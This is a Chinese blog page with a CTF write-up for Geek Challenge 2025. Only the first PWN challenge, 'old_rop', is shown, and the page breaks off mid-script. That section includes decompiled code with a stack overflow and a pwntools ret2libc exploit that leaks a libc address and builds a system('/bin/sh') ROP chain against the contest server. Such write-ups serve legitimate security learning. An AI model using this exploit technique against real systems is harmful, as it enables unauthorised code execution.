<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" 这里只收录了我个人的wp,我队友的部分就不放出来了 第一次写，写的烂，就当参考吧，可能有很多地方不严谨或有误 还请各位大佬指教\nPWN old_rop 解题流程 查保护 查伪代码\n">
<title>Geek Challenge 2025 WP</title>

<link rel='canonical' href='https://Converter258.github.io/p/geek-challenge-2025-wp/'>

<link rel="stylesheet" href="/scss/style.min.f6f0bafc3966f0649ec770ba82ed0cae4845338d8b4aefaaa919a31bee7cebff.css"><meta property='og:title' content="Geek Challenge 2025 WP">
<meta property='og:description' content=" 这里只收录了我个人的wp,我队友的部分就不放出来了 第一次写，写的烂，就当参考吧，可能有很多地方不严谨或有误 还请各位大佬指教\nPWN old_rop 解题流程 查保护 查伪代码\n">
<meta property='og:url' content='https://Converter258.github.io/p/geek-challenge-2025-wp/'>
<meta property='og:site_name' content='Converter258'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='WP' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-12-11T00:15:00&#43;08:00'/><meta property='article:modified_time' content='2025-12-11T00:15:00&#43;08:00'/><meta property='og:image' content='https://Converter258.github.io/p/geek-challenge-2025-wp/background.png' />
<meta name="twitter:title" content="Geek Challenge 2025 WP">
<meta name="twitter:description" content=" 这里只收录了我个人的wp,我队友的部分就不放出来了 第一次写，写的烂，就当参考吧，可能有很多地方不严谨或有误 还请各位大佬指教\nPWN old_rop 解题流程 查保护 查伪代码\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://Converter258.github.io/p/geek-challenge-2025-wp/background.png' />
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_f4434711c60fa7a7.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">☘</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Converter258</a></h1>
            <h2 class="site-description">孩子快饿死了，赏我点吃的吧</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/Converter258'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>主页</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>搜索</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>归档</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%85%B3%E4%BA%8E/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>关于</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>友情链接</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>暗色模式</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#pwn">PWN</a>
      <ol>
        <li><a href="#old_rop">old_rop</a>
          <ol>
            <li><a href="#解题流程">解题流程</a></li>
            <li><a href="#exp">exp</a></li>
          </ol>
        </li>
        <li><a href="#mission-calculator">Mission Calculator</a>
          <ol>
            <li><a href="#解题流程-1">解题流程</a></li>
            <li><a href="#exp-1">exp</a></li>
          </ol>
        </li>
        <li><a href="#mission-cipher-text">Mission Cipher Text</a>
          <ol>
            <li><a href="#解题流程-2">解题流程</a></li>
            <li><a href="#exp-2">exp</a></li>
          </ol>
        </li>
        <li><a href="#mission-exception-registration">Mission Exception Registration</a>
          <ol>
            <li><a href="#解题流程-3">解题流程</a></li>
            <li><a href="#exp-3">exp</a></li>
          </ol>
        </li>
        <li><a href="#次元囚笼">次元囚笼</a>
          <ol>
            <li><a href="#解题流程-4">解题流程</a></li>
            <li><a href="#exp-4">exp</a></li>
          </ol>
        </li>
        <li><a href="#mission-transponder">Mission Transponder</a>
          <ol>
            <li><a href="#解题流程-5">解题流程</a></li>
            <li><a href="#exp-5">exp</a></li>
          </ol>
        </li>
        <li><a href="#mission-ember">Mission Ember</a>
          <ol>
            <li><a href="#解题流程-6">解题流程</a></li>
            <li><a href="#exp-6">exp</a></li>
          </ol>
        </li>
        <li><a href="#血池轮回">血池轮回</a>
          <ol>
            <li><a href="#解题流程-7">解题流程</a></li>
            <li><a href="#exp-7">exp</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#re">RE</a>
      <ol>
        <li><a href="#encode">encode</a>
          <ol>
            <li><a href="#解题流程-8">解题流程</a></li>
            <li><a href="#exp-8">exp</a></li>
            <li><a href="#flag">flag</a></li>
          </ol>
        </li>
        <li><a href="#ez_pyyy">ez_pyyy</a>
          <ol>
            <li><a href="#解题流程-9">解题流程</a></li>
            <li><a href="#exp-9">exp</a></li>
            <li><a href="#flag-1">flag</a></li>
          </ol>
        </li>
        <li><a href="#only_flower">only_flower</a>
          <ol>
            <li><a href="#解题流程-10">解题流程</a></li>
            <li><a href="#exp-10">exp</a></li>
            <li><a href="#flag-2">flag</a></li>
          </ol>
        </li>
        <li><a href="#ezru3t">ezRu3t</a>
          <ol>
            <li><a href="#解题流程-11">解题流程</a></li>
            <li><a href="#exp-11">exp</a></li>
            <li><a href="#flag-3">flag</a></li>
          </ol>
        </li>
        <li><a href="#ezsmc">ezSMC</a>
          <ol>
            <li><a href="#exp-12">exp</a></li>
            <li><a href="#flag-4">flag</a></li>
          </ol>
        </li>
        <li><a href="#qyqsの奇妙冒险">QYQSの奇妙冒险</a>
          <ol>
            <li><a href="#解题流程-12">解题流程</a></li>
            <li><a href="#exp-13">exp</a></li>
            <li><a href="#flag-5">flag</a></li>
          </ol>
        </li>
        <li><a href="#gensh1n">Gensh1n</a>
          <ol>
            <li><a href="#解题思路">解题思路</a></li>
            <li><a href="#exp-14">exp</a></li>
            <li><a href="#flag-6">flag</a></li>
          </ol>
        </li>
        <li><a href="#qyqsの奇妙冒险2">QYQSの奇妙冒险2</a>
          <ol>
            <li><a href="#解题流程-13">解题流程</a></li>
            <li><a href="#exp-15">exp</a></li>
            <li><a href="#flag-7">flag</a></li>
          </ol>
        </li>
        <li><a href="#ez_vm">ez_vm</a>
          <ol>
            <li><a href="#解题流程-14">解题流程</a></li>
            <li><a href="#exp-16">exp</a></li>
            <li><a href="#flag-8">flag</a></li>
          </ol>
        </li>
        <li><a href="#geekbinder">GeekBinder</a>
          <ol>
            <li><a href="#解题流程-15">解题流程</a></li>
            <li><a href="#exp-17">exp</a></li>
            <li><a href="#flag-9">flag</a></li>
          </ol>
        </li>
        <li><a href="#obfuscat3">obfuscat3</a>
          <ol>
            <li><a href="#解题流程-16">解题流程</a></li>
            <li><a href="#exp-18">exp</a></li>
            <li><a href="#flag-10">flag</a></li>
          </ol>
        </li>
        <li><a href="#lastone">Lastone</a>
          <ol>
            <li><a href="#解题流程-17">解题流程</a></li>
            <li><a href="#exp-19">exp</a></li>
            <li><a href="#flag-11">flag</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#misc">Misc</a>
      <ol>
        <li><a href="#evil_mcp">evil_mcp</a>
          <ol>
            <li><a href="#解题流程-18">解题流程</a></li>
            <li><a href="#exp-20">exp</a></li>
          </ol>
        </li>
        <li><a href="#bite-off-picture">Bite off picture</a>
          <ol>
            <li><a href="#解题流程-19">解题流程</a></li>
            <li><a href="#flag-12">flag</a></li>
          </ol>
        </li>
        <li><a href="#blockchain-signin">Blockchain SignIn</a>
          <ol>
            <li><a href="#解题流程-20">解题流程</a></li>
            <li><a href="#flag-13">flag</a></li>
          </ol>
        </li>
        <li><a href="#hidden">hidden</a>
          <ol>
            <li><a href="#解题流程-21">解题流程</a></li>
            <li><a href="#flag-14">flag</a></li>
          </ol>
        </li>
        <li><a href="#crdt">CRDT</a>
          <ol>
            <li><a href="#解题流程-22">解题流程</a></li>
            <li><a href="#exp-21">exp</a></li>
            <li><a href="#flag-15">flag</a></li>
          </ol>
        </li>
        <li><a href="#monitoring">monitoring</a>
          <ol>
            <li><a href="#解题记录">解题记录</a></li>
            <li><a href="#flag-16">flag</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ol>
        <li><a href="#ez_xor">ez_xor</a>
          <ol>
            <li><a href="#解题记录-1">解题记录</a></li>
            <li><a href="#exp-22">exp</a></li>
            <li><a href="#flag-17">flag</a></li>
          </ol>
        </li>
        <li><a href="#caesar-slot-machine">Caesar Slot Machine</a>
          <ol>
            <li><a href="#解题记录-2">解题记录</a></li>
            <li><a href="#exp-23">exp</a></li>
          </ol>
        </li>
        <li><a href="#ez_ecc">ez_ecc</a>
          <ol>
            <li><a href="#解题记录-3">解题记录</a></li>
            <li><a href="#exp-24">exp</a></li>
            <li><a href="#flag-18">flag</a></li>
          </ol>
        </li>
        <li><a href="#pem">pem</a>
          <ol>
            <li><a href="#解题记录-4">解题记录</a></li>
            <li><a href="#exp-25">exp</a></li>
            <li><a href="#flag-19">flag</a></li>
          </ol>
        </li>
        <li><a href="#baby_rabin">baby_rabin</a>
          <ol>
            <li><a href="#解题记录-5">解题记录</a></li>
            <li><a href="#exp-26">exp</a></li>
          </ol>
        </li>
        <li><a href="#xor_revenge">xor_revenge</a>
          <ol>
            <li><a href="#解题记录-6">解题记录</a></li>
            <li><a href="#flag-20">flag</a></li>
          </ol>
        </li>
        <li><a href="#dp_spill">dp_spill</a>
          <ol>
            <li><a href="#解题记录-7">解题记录</a></li>
            <li><a href="#exp-27">exp</a></li>
            <li><a href="#flag-21">flag</a></li>
          </ol>
        </li>
        <li><a href="#disclose">Disclose</a>
          <ol>
            <li><a href="#解题记录-8">解题记录</a></li>
            <li><a href="#exp-28">exp</a></li>
          </ol>
        </li>
        <li><a href="#easy_rsa">easy_RSA?</a>
          <ol>
            <li><a href="#解题记录-9">解题记录</a></li>
            <li><a href="#exp-29">exp</a></li>
            <li><a href="#flag-22">flag</a></li>
          </ol>
        </li>
        <li><a href="#s_box">S_box</a>
          <ol>
            <li><a href="#exp-30">exp</a></li>
            <li><a href="#flag-23">flag</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/geek-challenge-2025-wp/">
                <img src="/p/geek-challenge-2025-wp/background_hu_f1e8cbe78618b91a.png"
                        srcset="/p/geek-challenge-2025-wp/background_hu_f1e8cbe78618b91a.png 800w, /p/geek-challenge-2025-wp/background_hu_2e23a8990a1fd57b.png 1600w"
                        width="800" 
                        height="566" 
                        loading="lazy"
                        alt="Featured image of post Geek Challenge 2025 WP" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/wp/" style="background-color: #000000ff; color: #000000ff;">
                WP
            </a>
        
            <a href="/categories/ctf/" style="background-color: #000000ff; color: #000000ff;">
                CTF
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/geek-challenge-2025-wp/">Geek Challenge 2025 WP</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published" datetime='2025-12-11T00:15:00&#43;08:00'>2025-12-11</time>
            </div>
        

        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <hr>
<p>这里只收录了我个人的wp,我队友的部分就不放出来了
第一次写，写的烂，就当参考吧，可能有很多地方不严谨或有误
还请各位大佬指教</p>
<h2 id="pwn">PWN
</h2><h3 id="old_rop">old_rop
</h3><h4 id="解题流程">解题流程
</h4><p>查保护
<img src="/p/geek-challenge-2025-wp/image.png"
	width="461"
	height="200"
	srcset="/p/geek-challenge-2025-wp/image_hu_bd0b468abfb9627.png 480w, /p/geek-challenge-2025-wp/image_hu_8466d12726943c35.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="230"
		data-flex-basis="553px"
	
>
查伪代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_QWORD</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span> <span class="c1">// [rsp+10h] [rbp-50h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Hello, World</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0xDuLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;welcome to ret2csu , but there is sometings different,please care about it !&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x4DuLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_401156</span><span class="p">(</span><span class="mi">1LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">sub_401156</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_BYTE</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-80h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x200uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在sub_401156有一个明显栈溢出，没有后门函数，打libc，得先泄露libc基址，用write打印即可，但此处没有控制rdx的gadget,只能用read的时候rdx的残余值0x200多打印一些，然后正常写rop链即可</p>
<h4 id="exp">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="c1"># io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;geek.ctfplus.cn&#39;</span><span class="p">,</span><span class="mi">32696</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc/libc.so.6&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwnt&#34;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000004012d3</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0x000000000040101a</span> 
</span></span><span class="line"><span class="cl"><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0000000000401156</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x00000000004012d1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payleak</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payleak</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">leaked_data</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x200</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leaked_data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Leaked write address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span><span class="o">.</span><span class="fm">__next__</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;system:&#34;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;binsh:&#34;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
